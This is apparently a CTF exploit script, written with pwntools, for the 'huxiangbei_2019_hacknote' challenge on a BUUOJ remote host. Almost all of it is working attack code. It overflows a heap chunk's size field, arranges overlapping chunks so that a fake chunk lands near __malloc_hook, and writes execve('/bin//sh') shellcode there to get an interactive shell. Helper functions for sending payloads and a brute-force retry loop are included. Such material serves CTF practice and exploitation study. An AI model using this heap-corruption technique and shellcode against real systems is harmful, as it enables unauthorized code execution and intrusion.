# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './huxiangbei_2019_hacknote'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
# libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    # libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27751'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('4. Exit\n-----------------\n',num)

def add(size , text):
    cmd(1)
    sla('Size:\n' , size)
    sla('Note:\n' , text)

def delete(idx):
    cmd(2)
    sla('Note:\n' , idx)

def edit(idx , text):
    cmd(3)
    sla('Index of Note:\n' , idx)
    sla('Note:\n' , text)

malloc_hook = 0x6cb788
fake = malloc_hook - 0x16

shellcode = '\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05'

add(0x18,'a'*0x10) #0
add(0x60,'b'*0x10) #1
add(0x30,'c'*0x10) #2
add(0x10,'d'*0x10) #3
edit(0,'a'*0x18+'\n')
edit(0,'a'*0x18 + '\xb1'+'\n')
# 改大 size ，经典堆块重用

delete( 2 )
delete( 1 )

add(0xa0,'c'*0x60 + p64(0) + p64(0x41)+p64(fake))
add(0x30,'d')
add(0x30,'a'*0x6 + p64(malloc_hook + 0x8)+ shellcode) 
# dbg()


# one_gad = one_gadget(libc.path)

p.interactive()

'''
@File    :   huxiangbei_2019_hacknote.py
@Time    :   2021/09/24 11:19:00
@Author  :   Niyah 
'''